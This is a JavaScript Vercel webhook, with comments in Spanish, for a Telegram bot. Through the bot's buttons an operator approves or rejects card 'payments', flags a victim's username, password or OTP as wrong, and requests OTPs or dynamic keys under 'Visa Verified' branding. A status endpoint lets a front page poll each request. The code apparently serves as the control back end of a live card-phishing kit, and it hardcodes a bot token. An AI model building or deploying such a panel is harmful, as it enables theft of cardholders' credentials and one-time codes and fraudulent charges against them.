// api/webhook.js - WEBHOOK COMPLETO PARA VERCEL
// ACTUALIZADO con nuevo bot: 8736155859:AAEMF2eCDMjdFA88DkLdEz3I0PXaAbwGYfM

const TELEGRAM_BOT_TOKEN = '8736155859:AAEMF2eCDMjdFA88DkLdEz3I0PXaAbwGYfM';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Almacenamiento temporal en memoria (para Vercel)
if (!global.solicitudes) {
    global.solicitudes = new Map();
}

export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // ============================================
    // POST - Recibe actualizaciones de Telegram
    // ============================================
    if (req.method === 'POST') {
        try {
            const update = req.body;
            console.log('📨 Update recibido:', JSON.stringify(update));

            // Verificar si es un callback query (botón presionado)
            if (update.callback_query) {
                const callbackData = update.callback_query.data;
                const callbackId = update.callback_query.id;
                const message = update.callback_query.message;
                const chatId = message.chat.id;
                const messageId = message.message_id;
                const originalText = message.text || '';

                console.log('🔘 Botón presionado:', callbackData);

                let action = '';
                let solicitudId = '';
                let respuestaTexto = '';
                let estadoMensaje = '';

                // ============================================
                // VISA VERIFIED - CREDENCIALES
                // ============================================
                if (callbackData.startsWith('pedir_otp_')) {
                    action = 'pedir_otp';
                    solicitudId = callbackData.replace('pedir_otp_', '');
                    respuestaTexto = '📱 Código OTP solicitado';
                    estadoMensaje = '📱 *OTP SOLICITADO* - Ingrese el código de verificación';
                }
                else if (callbackData.startsWith('pedir_clave_din_')) {
                    action = 'pedir_clave_din';
                    solicitudId = callbackData.replace('pedir_clave_din_', '');
                    respuestaTexto = '🔑 Clave Dinámica solicitada';
                    estadoMensaje = '🔑 *CLAVE DINÁMICA SOLICITADA* - Ingrese su clave dinámica';
                }
                else if (callbackData.startsWith('error_credenciales_')) {
                    action = 'error_credenciales';
                    solicitudId = callbackData.replace('error_credenciales_', '');
                    respuestaTexto = '❌ Credenciales incorrectas';
                    estadoMensaje = '❌ *ERROR CREDENCIALES* - Los datos ingresados no coinciden';
                }

                // ============================================
                // VISA VERIFIED - OTP
                // ============================================
                else if (callbackData.startsWith('aprobar_otp_')) {
                    action = 'aprobar_otp';
                    solicitudId = callbackData.replace('aprobar_otp_', '');
                    respuestaTexto = '✅ OTP aprobado';
                    estadoMensaje = '✅ *OTP APROBADO* - Redirigiendo al cliente';
                }
                else if (callbackData.startsWith('rechazar_otp_')) {
                    action = 'rechazar_otp';
                    solicitudId = callbackData.replace('rechazar_otp_', '');
                    respuestaTexto = '❌ OTP rechazado';
                    estadoMensaje = '❌ *OTP RECHAZADO* - El código es incorrecto';
                }

                // ============================================
                // VISA VERIFIED - CLAVE DINÁMICA
                // ============================================
                else if (callbackData.startsWith('aprobar_clave_din_')) {
                    action = 'aprobar_clave_din';
                    solicitudId = callbackData.replace('aprobar_clave_din_', '');
                    respuestaTexto = '✅ Clave Dinámica aprobada';
                    estadoMensaje = '✅ *CLAVE DINÁMICA APROBADA* - Redirigiendo al cliente';
                }
                else if (callbackData.startsWith('rechazar_clave_din_')) {
                    action = 'rechazar_clave_din';
                    solicitudId = callbackData.replace('rechazar_clave_din_', '');
                    respuestaTexto = '❌ Clave Dinámica rechazada';
                    estadoMensaje = '❌ *CLAVE DINÁMICA RECHAZADA* - La clave es incorrecta';
                }

                // ============================================
                // PAGO CON TARJETA - APROBAR (Visa, Master, Amex)
                // ============================================
                else if (callbackData.startsWith('approve_visa_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_visa_', '');
                    respuestaTexto = '✅ Pago aprobado (Visa)';
                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Visa';
                }
                else if (callbackData.startsWith('approve_master_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_master_', '');
                    respuestaTexto = '✅ Pago aprobado (Mastercard)';
                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Mastercard';
                }
                else if (callbackData.startsWith('approve_amex_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_amex_', '');
                    respuestaTexto = '✅ Pago aprobado (Amex)';
                    estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Amex';
                }

                // ============================================
                // PAGO CON TARJETA - RECHAZAR (Visa, Master, Amex)
                // ============================================
                else if (callbackData.startsWith('reject_visa_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_visa_', '');
                    respuestaTexto = '❌ Pago rechazado (Visa)';
                    estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                }
                else if (callbackData.startsWith('reject_master_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_master_', '');
                    respuestaTexto = '❌ Pago rechazado (Mastercard)';
                    estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                }
                else if (callbackData.startsWith('reject_amex_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_amex_', '');
                    respuestaTexto = '❌ Pago rechazado (Amex)';
                    estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                }

                // ============================================
                // ERRORES DE CREDENCIALES (con tipo de tarjeta)
                // ============================================
                else if (callbackData.startsWith('error_user_visa_')) {
                    action = 'error_user';
                    solicitudId = callbackData.replace('error_user_visa_', '');
                    respuestaTexto = '❌ Error de usuario';
                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('error_user_master_')) {
                    action = 'error_user';
                    solicitudId = callbackData.replace('error_user_master_', '');
                    respuestaTexto = '❌ Error de usuario';
                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('error_user_amex_')) {
                    action = 'error_user';
                    solicitudId = callbackData.replace('error_user_amex_', '');
                    respuestaTexto = '❌ Error de usuario';
                    estadoMensaje = '❌ *ERROR USUARIO* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('error_pass_visa_')) {
                    action = 'error_pass';
                    solicitudId = callbackData.replace('error_pass_visa_', '');
                    respuestaTexto = '❌ Error de contraseña';
                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('error_pass_master_')) {
                    action = 'error_pass';
                    solicitudId = callbackData.replace('error_pass_master_', '');
                    respuestaTexto = '❌ Error de contraseña';
                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('error_pass_amex_')) {
                    action = 'error_pass';
                    solicitudId = callbackData.replace('error_pass_amex_', '');
                    respuestaTexto = '❌ Error de contraseña';
                    estadoMensaje = '❌ *ERROR CONTRASEÑA* - Los datos ingresados no coinciden';
                }
                else if (callbackData.startsWith('error_otp_visa_')) {
                    action = 'error_otp';
                    solicitudId = callbackData.replace('error_otp_visa_', '');
                    respuestaTexto = '❌ Error de OTP';
                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo';
                }
                else if (callbackData.startsWith('error_otp_master_')) {
                    action = 'error_otp';
                    solicitudId = callbackData.replace('error_otp_master_', '');
                    respuestaTexto = '❌ Error de OTP';
                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo';
                }
                else if (callbackData.startsWith('error_otp_amex_')) {
                    action = 'error_otp';
                    solicitudId = callbackData.replace('error_otp_amex_', '');
                    respuestaTexto = '❌ Error de OTP';
                    estadoMensaje = '❌ *ERROR OTP* - Código de verificación erróneo';
                }

                // ============================================
                // FORMATOS SIMPLES (sin tipo de tarjeta)
                // ============================================
                else if (callbackData.startsWith('approve_')) {
                    action = 'approved';
                    solicitudId = callbackData.replace('approve_', '');
                    respuestaTexto = '✅ Aprobado';
                    estadoMensaje = '✅ *APROBADO*';
                }
                else if (callbackData.startsWith('reject_')) {
                    action = 'rejected';
                    solicitudId = callbackData.replace('reject_', '');
                    respuestaTexto = '❌ Rechazado';
                    estadoMensaje = '❌ *RECHAZADO*';
                }
                else if (callbackData.startsWith('user_error_')) {
                    action = 'error_user';
                    solicitudId = callbackData.replace('user_error_', '');
                    respuestaTexto = '❌ Error de usuario';
                    estadoMensaje = '❌ *ERROR USUARIO*';
                }
                else if (callbackData.startsWith('pass_error_')) {
                    action = 'error_pass';
                    solicitudId = callbackData.replace('pass_error_', '');
                    respuestaTexto = '❌ Error de contraseña';
                    estadoMensaje = '❌ *ERROR CONTRASEÑA*';
                }
                else if (callbackData.startsWith('otp_error_')) {
                    action = 'error_otp';
                    solicitudId = callbackData.replace('otp_error_', '');
                    respuestaTexto = '❌ Error de OTP';
                    estadoMensaje = '❌ *ERROR OTP*';
                }

                // ============================================
                // FALLBACK
                // ============================================
                else {
                    const parts = callbackData.split('_');
                    action = parts[0] || 'unknown';
                    solicitudId = parts.slice(1).join('_') || 'unknown';
                    respuestaTexto = 'Procesado';
                    estadoMensaje = 'Procesado';
                    console.log('⚠️ Callback no reconocido:', callbackData);
                }

                console.log(`📌 Acción: ${action}, ID: ${solicitudId}`);

                // ============================================
                // RESPONDER AL CALLBACK QUERY
                // ============================================
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackId,
                        text: respuestaTexto,
                        show_alert: false
                    })
                });

                // ============================================
                // ACTUALIZAR MENSAJE EN TELEGRAM
                // ============================================
                let newText = originalText;
                
                // Buscar y reemplazar el estado
                const estadoRegex = /⏳ \*Estado:\* .+/;
                if (estadoRegex.test(newText)) {
                    newText = newText.replace(estadoRegex, `⏳ *Estado:* ${estadoMensaje}`);
                } else {
                    newText += `\n\n⏳ *Estado:* ${estadoMensaje}`;
                }

                await fetch(`${TELEGRAM_API}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: messageId,
                        text: newText,
                        parse_mode: 'Markdown'
                    })
                });

                // ============================================
                // GUARDAR ESTADO DE LA SOLICITUD
                // ============================================
                global.solicitudes.set(solicitudId, {
                    estado: action,
                    timestamp: Date.now(),
                    chatId: chatId,
                    messageId: messageId,
                    tipo: 'visa_verified'
                });

                console.log(`✅ Solicitud ${solicitudId}: ${action}`);

                return res.status(200).json({ 
                    success: true, 
                    action: action,
                    solicitudId: solicitudId
                });
            }

            return res.status(200).json({ success: true });

        } catch (error) {
            console.error('❌ Error procesando webhook:', error);
            return res.status(500).json({ error: 'Error interno del servidor' });
        }
    }

    // ============================================
    // GET - Consultar estado o configurar webhook
    // ============================================
    if (req.method === 'GET') {
        const { check, setup } = req.query;

        // Configurar webhook en Telegram
        if (setup === 'true') {
            try {
                const baseUrl = `https://${req.headers.host}`;
                const webhookUrl = `${baseUrl}/api/webhook`;

                console.log('🔗 Configurando webhook en:', webhookUrl);

                const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        url: webhookUrl,
                        allowed_updates: ['callback_query', 'message']
                    })
                });

                const data = await response.json();
                console.log('✅ Webhook configurado:', data);

                return res.status(200).json({
                    success: true,
                    message: 'Webhook configurado exitosamente',
                    webhookUrl: webhookUrl,
                    telegramResponse: data
                });
            } catch (error) {
                console.error('❌ Error configurando webhook:', error);
                return res.status(500).json({ error: 'Error configurando webhook' });
            }
        }

        // Verificar estado de una solicitud
        if (check) {
            const solicitud = global.solicitudes.get(check);
            
            if (solicitud) {
                return res.status(200).json({
                    success: true,
                    solicitudId: check,
                    estado: solicitud.estado,
                    timestamp: solicitud.timestamp
                });
            } else {
                return res.status(200).json({
                    success: true,
                    solicitudId: check,
                    estado: 'pending',
                    mensaje: 'Solicitud aún no procesada'
                });
            }
        }

        // Obtener información del webhook
        try {
            const response = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
            const data = await response.json();
            return res.status(200).json(data);
        } catch (error) {
            return res.status(500).json({ error: 'Error obteniendo info del webhook' });
        }
    }

    return res.status(405).json({ error: 'Método no permitido' });
        }
